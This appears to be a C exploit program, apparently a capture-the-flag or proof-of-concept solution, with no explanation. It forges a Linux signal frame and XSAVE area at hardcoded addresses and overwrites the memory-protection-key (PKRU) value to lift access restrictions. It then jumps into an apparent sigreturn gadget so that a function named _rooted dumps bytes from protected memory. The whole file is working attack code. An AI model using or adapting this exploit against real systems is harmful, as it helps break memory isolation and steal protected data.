#include <sys/types.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#define FP_XSTATE_MAGIC1		0x46505853U
#define FP_XSTATE_MAGIC2		0x46505845U
#define FP_XSTATE_MAGIC2_SIZE		sizeof(FP_XSTATE_MAGIC2)

struct ucontext_1 {
    unsigned long              uc_flags;
    struct ucontext_1*           uc_link;
    stack_t                    uc_stack;
    struct sigcontext          uc_mcontext;
    unsigned long                   uc_sigmask;
} my;


void handler(int sig, siginfo_t *info, void *ucontext){
    //printf("sig!!!\n");
    struct ucontext_1 * _uctx = (struct ucontext_1*) ucontext;
    memcpy(&(my.uc_mcontext), &(_uctx->uc_mcontext), sizeof(struct sigcontext));
    //_uctx->uc_mcontext.
}

struct xstate_region {
    /* 64-bit FXSAVE format.  */
    uint16_t		cwd;
    uint16_t		swd;
    uint16_t		ftw;
    uint16_t		fop;
    uint64_t		rip;
    uint64_t		rdp;
    uint32_t		mxcsr;
    uint32_t		mxcr_mask;
    struct _libc_fpxreg	_st[8];
    struct _libc_xmmreg	_xmm[16];

    uint32_t				reserved2[12];
    struct _fpx_sw_bytes reserved;

    //uint8_t extension[0];

    // FP_XSTATE_MAGIC2
    char extension[2700];
};
struct rt_sigframe {
	char *pretcode;
	struct ucontext_1 uc;
	siginfo_t info;
	/* fp state follows here */
};

struct xstate_region x;
 
#define __round_mask(x, y) ((__typeof__(x))((y)-1))
#define round_down(x, y) ((x) & ~__round_mask(x, y))
static unsigned long align_sigframe(unsigned long sp)
{
	sp = round_down(sp, 16) - 8;
	return sp;
}


static inline void __cpuid1(unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx)
{
	/* ecx is often an input as well as an output. */
	asm volatile(
		"cpuid;"
		: "=a" (*eax),
		  "=b" (*ebx),
		  "=c" (*ecx),
		  "=d" (*edx)
		: "0" (*eax), "2" (*ecx));
}

#define XSTATE_PKRU_BIT	(9)
#define XSTATE_PKRU	0x200
static int _pkru_xstate_offset = 0;
static inline int pkru_xstate_offset(void)
{
    if (_pkru_xstate_offset != 0)
        return _pkru_xstate_offset;

	unsigned int eax;
	unsigned int ebx;
	unsigned int ecx;
	unsigned int edx;
	int xstate_offset;
	int xstate_size;
	unsigned long XSTATE_CPUID = 0xd;
	int leaf;

	/* assume that XSTATE_PKRU is set in XCR0 */
	leaf = XSTATE_PKRU_BIT;
	{
		eax = XSTATE_CPUID;
		ecx = leaf;
		__cpuid1(&eax, &ebx, &ecx, &edx);

		if (leaf == XSTATE_PKRU_BIT) {
			xstate_offset = ebx;
			xstate_size = eax;
		}
	}

	if (xstate_size == 0) {
		//printf("could not find size/offset of PKRU in xsave state\n");
		return 0;
	}

	return _pkru_xstate_offset = xstate_offset;
}

static unsigned long x_size = 0;
static inline unsigned long get_extended_size(){
    if (x_size)
        return x_size;
    unsigned int eax;
    unsigned int ebx;
    unsigned int ecx;
    unsigned int edx;
    {
        unsigned long XSTATE_CPUID = 0xd;
        eax = XSTATE_CPUID;
        ecx = 0;
        __cpuid1(&eax, &ebx, &ecx, &edx);
    }

    x_size = ebx + FP_XSTATE_MAGIC2_SIZE;

    return x_size;
}


unsigned long alloc_sigframe(unsigned long old_rsp, unsigned long extended_size, struct xstate_region **fpstate) {
    if (extended_size == 0)
        extended_size = get_extended_size();
    
    old_rsp = round_down(old_rsp - extended_size, 64);
    *fpstate = (struct xstate_region *) old_rsp;
    old_rsp = align_sigframe(old_rsp - sizeof(struct rt_sigframe)); // allocate rt_sigframe
    return old_rsp;
}

void _xsave(char *buf) {
    // with mask = -1
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "not %%rax\n\t"
        "mov %%rax, %%rdx\n\t"
        "xsave %0"
        :"=m"(*buf) 
        ::"rax", "rdx");
}

unsigned char *tp = 4096-8+0x7ffff7fdf000;
char _stack_1[8192];

char buffer[4096];
const char hex_table[16] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
void _rooted(){
    for (int i = 0; i < 32; i++) {
        int v = *(tp + i);
        buffer[i*2] = hex_table[v / 16];
        buffer[i*2+1] = hex_table[v % 16];
    }
    buffer[64] = 0;
    puts(buffer);
    
    exit(1);
}

int main(){
    register unsigned long _rsp __asm__("rsp");
    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;
    sa.sa_sigaction = handler;
    sigaction(SIGUSR1, &sa, 0);
    kill(0, SIGUSR1);
    printf("stack=");
    void *stack = 0x7FFFF7FC8000 ;
    void *entry = 0x7ffff7dd3d20;
    //scanf("%p", &stack);
    printf("stack=%p\n", stack);

    *((unsigned long*)stack) = 1;

    printf("entry=");
    //scanf("%p", &entry);
    printf("entry=%p\n", entry);
    
    stack = stack + 4096;

    struct xstate_region * xs;
    
    struct rt_sigframe* f = (struct rt_sigframe*)alloc_sigframe((unsigned long)(stack - 0x80), get_extended_size(), &xs);
    //memset(f, 0, sizeof(struct rt_sigframe));
    memcpy(&f->uc.uc_mcontext, &my.uc_mcontext, sizeof(struct sigcontext));
    f->uc.uc_mcontext.__fpstate_word = (unsigned long)xs;
    f->uc.uc_mcontext.rsp = _rsp;//_stack_1 + 4096;
    f->uc.uc_mcontext.rip = (unsigned long)_rooted;
    f->uc.uc_mcontext.rax = 0xdeadbeef;
    
    f->uc.uc_flags = 0x1;
    f->pretcode = (unsigned long)_rooted;

    _xsave((char*)xs);
    xs->reserved.magic1 = FP_XSTATE_MAGIC1;
    xs->reserved.extended_size = get_extended_size();
    xs->reserved.xstate_size = get_extended_size() - sizeof(unsigned int);
    xs->reserved.xstate_bv = -1;
    
    printf("%p\n", *((unsigned int*) (((void*)xs) + pkru_xstate_offset())));
    *((unsigned int*) (((void*)xs) + pkru_xstate_offset())) = 0x55555550;
    *((unsigned int*) (((void*)xs) + xs->reserved.xstate_size)) = FP_XSTATE_MAGIC2;
    
    asm(
        "mov %0, %%rsp\n\t"
        "mov $10, %%rdi\n\t"
        "mov %%rdx, %%rsi\n\t"
        "mov %%rcx, %%rdx\n\t"
        "jmpq *%%rbx\n\t"
        :
        :"r"(f), "d"((unsigned long)(&f->info)), "c"((unsigned long)(&f->uc)), "b"(entry)
        :"memory"
    );
}
